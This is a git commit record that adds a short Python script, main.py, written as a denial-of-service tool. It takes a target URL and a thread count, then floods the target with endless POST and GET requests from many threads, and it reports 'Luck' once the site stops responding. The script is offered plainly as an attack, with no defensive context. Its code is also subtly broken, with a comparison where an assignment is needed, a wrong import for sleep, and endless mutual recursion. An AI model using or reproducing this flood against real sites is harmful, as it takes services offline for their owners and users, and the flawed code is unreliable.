d9ac40f3d560adb7f97743107b8a6fffa6b083ee
Alexander Laptev <sashalaptev327@gmail.com>
2022-03-01 16:17:36 +0700

    dev

---
+++ main.py
@@ -0,0 +1,57 @@
+import requests
+import datetime
+
+from threading import Thread
+from datetime import time
+
+url = input('Url: ')
+thrnom = input('Threads: ')
+
+on = 1
+
+def ddos():
+
+	while True:
+		try:
+			spam = requests.post(url)
+
+			spam2 = requests.get(url)
+
+		except requests.exceptions.ConnectionError:
+			on == 0
+			print('\nLuck\n')
+
+			ddos_pause()
+			break
+
+def ddos_start():
+	print("\nRunning...")
+
+	if on == 1:
+		for i in range(int(thrnom)):
+
+			try:
+				thr = Thread(target = ddos)
+				thr.start()
+
+			except:
+				ddos_pause()
+				break
+	else:
+		ddos_pause()
+
+def ddos_pause():
+
+	print("Paused.")
+
+	time.sleep(3)
+	try:
+		on = 1
+		ddos_start()
+	except:
+		on = 0
+		print('\nTry..')
+		ddos_pause()
+
+if on == 1:
+	ddos_start()
